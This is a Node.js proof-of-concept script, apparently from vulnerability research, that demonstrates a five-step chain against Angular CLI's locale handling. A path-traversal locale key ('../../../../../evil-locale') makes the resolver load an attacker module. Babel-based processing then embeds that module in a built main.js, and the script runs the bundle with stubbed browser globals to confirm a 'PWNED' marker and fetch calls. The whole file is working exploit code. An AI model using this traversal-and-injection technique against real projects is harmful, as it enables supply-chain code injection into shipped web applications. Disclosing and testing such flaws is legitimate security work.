// C4A — Chain 4 full demo (CJS requires to the pinned store @babel packages)
const { createRequire } = require('node:module');
const path = require('node:path');
const fs = require('node:fs');

const projectRoot = path.join(__dirname, 'project');
const ATTCK = require('node:fs').realpathSync(path.join(__dirname, 'evil-locale.js'));
const B = path.join(__dirname, 'node_modules', '@babel');
const core = require(B + '/core');
const template = require(B + '/template');

// === HOP 1: i18n-webpack.ts:52-58 verbatim resolution ===
const LOCALE_DATA_BASE_MODULE = '@angular/common/locales/global';
const projectRequire = createRequire(projectRoot + '/');
const localeResolver = (locale) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, locale));

// === HOP 2: findLocaleDataPath (i18n-webpack.ts:135-143 verbatim) ===
function findLocaleDataPath(locale, resolver) {
  const scrubbedLocale = locale.replace(/-x(-[a-zA-Z0-9]{1,8})+$/, '');
  try { return resolver(scrubbedLocale); }
  catch { return scrubbedLocale === 'en-US' ? findLocaleDataPath('en', resolver) : null; }
}

const MAL_KEY = '../../../../../evil-locale';
const localeDataPath = findLocaleDataPath(MAL_KEY, localeResolver);
console.log('[HOP2] malicious key', JSON.stringify(MAL_KEY), '-> resolved dataPath:', localeDataPath);
console.log('[HOP2] is attacker module?', localeDataPath === ATTCK);
if (localeDataPath !== ATTCK) { console.log('[FAIL] resolution did not reach the attacker module'); process.exit(1); }

const ctl = findLocaleDataPath('en', localeResolver);
console.log('[CTRL] benign en ->', ctl, '| inside package?', ctl && ctl.includes('@angular/common'));

// === HOP 3: loadLocaleData (process-bundle.ts:373-390: read + Babel preset-env esmodules minified) ===
(async () => {
  const content = fs.readFileSync(localeDataPath, 'utf8');
  const out = await core.transformAsync(content, {
    filename: localeDataPath,
    inputSourceMap: false,
    babelrc: false,
    configFile: false,
    presets: [[require.resolve(B + '/preset-env'), { targets: { esmodules: true } }]],
    minified: true,
  });
  const localeDataContent = out.code;
  console.log('[HOP3] transformed attacker content head:', JSON.stringify(localeDataContent.slice(0, 150)));

  // === HOP 4: process-bundle.ts:87-91 embedding (unshiftContainer Program body) ===
  const appChunk = "var App = function () { return { bootstrap: function () { console.log('APP-BOOT'); } }; };";
  const ast = core.parseSync(appChunk, { filename: 'main.js' });
  const parsed = template.default.ast(localeDataContent); // Babel 8: single node OR statement array
  const parsedBody = Array.isArray(parsed) ? parsed : (parsed.type === 'Program' ? parsed.body : [parsed]);
  ast.program.body.unshift(...parsedBody);
  const { code: localizedChunk } = core.transformFromAstSync(ast, appChunk, { filename: 'main.js', babelrc: false, configFile: false, compact: true });
  fs.mkdirSync(path.join(__dirname, 'dist'), { recursive: true });
  fs.writeFileSync(path.join(__dirname, 'dist', 'main.js'), localizedChunk);
  console.log('[HOP4] localized chunk written to dist/main.js (' + localizedChunk.length + ' bytes)');

  // === HOP 5: browser execution (DOM-less stub) ===
  console.log('--- executing dist/main.js with DOM stub ---');
  const window = {};
  const document = { title: 'original-title' };
  const calls = [];
  window.document = document; // browser wiring: window.document
  global.window = window;
  global.document = document;
  global.fetch = (url) => { calls.push(url); return Promise.resolve({ ok: true }); };
  const chunkSrc = fs.readFileSync(path.join(__dirname, 'dist', 'main.js'), 'utf8');
  (0, eval)(chunkSrc);  // browser-style global-scope execution
  console.log('[HOP5] window.__chain4 =', JSON.stringify(window.__chain4));
  console.log('[HOP5] document.title =', JSON.stringify(document.title));
  console.log('[HOP5] fetch calls =', JSON.stringify(calls));
  const ok = window.__chain4 === 'CHAIN4-PWNED-9f3c1e' && document.title === 'CHAIN4-PWNED-9f3c1e' && calls.length >= 1;
  console.log('[HOP5] EXECUTION-DEMONSTRATED =', ok);
  process.exit(ok ? 0 : 2);
})();
